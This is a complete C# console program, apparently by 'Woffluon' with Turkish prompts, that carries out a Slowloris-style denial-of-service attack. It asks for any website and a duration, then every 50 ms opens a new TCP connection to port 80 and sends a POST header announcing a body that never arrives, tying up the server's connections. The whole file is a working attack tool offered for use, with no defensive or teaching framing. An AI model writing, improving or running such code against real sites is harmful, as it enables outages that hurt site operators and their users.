using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace WoffDoser
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("\n             +-----------------------------------------------------+");
            Console.WriteLine("             +                                                     +");
            Console.WriteLine("             +  Simple Slowloris Flooder - Coded By Woffluon       +");
            Console.WriteLine("             +                                                     +");
            Console.WriteLine("             +-----------------------------------------------------+\n");
            Console.Write("Web Sitesi (www.example.com): ");
            string website = Console.ReadLine();
            Console.Write("Süre (saniye): ");
            string s = Console.ReadLine();
            int count = 1;
            bool loop = true;
            Thread thread = new Thread(delegate ()
            {
                List<TcpClient> clients = new List<TcpClient>();
                while (loop)
                {
                    new Thread(delegate ()
                    {
                        TcpClient tcpClient2 = new TcpClient();
                        clients.Add(tcpClient2);
                        try
                        {
                            tcpClient2.Connect(website, 80);
                            StreamWriter streamWriter = new StreamWriter(tcpClient2.GetStream());
                            streamWriter.Write("POST / HTTP/1.1\r\nHost: " + website + "\r\nContent-length: 5235\r\n\r\n");
                            streamWriter.Flush();
                            if (loop)
                            {
                                Console.WriteLine("Packets sent: " + count);
                            }
                            count++;
                        }
                        catch (Exception)
                        {
                            if (loop)
                            {
                                Console.WriteLine("Could not send packets, server may be inaccessible.");
                            }
                        }
                    }).Start();
                    Thread.Sleep(50);
                }
                foreach (TcpClient tcpClient in clients)
                {
                    try
                    {
                        tcpClient.GetStream().Dispose();
                    }
                    catch (Exception)
                    {
                    }
                }
            });
            thread.Start();
            Thread.Sleep(int.Parse(s) * 1000);
            loop = false;
            Console.WriteLine("\nBitti! (:");
            Console.WriteLine("Programı kapatmak için herhangi bir tuşa basın...");
            Console.ReadKey();
        }
    }
}

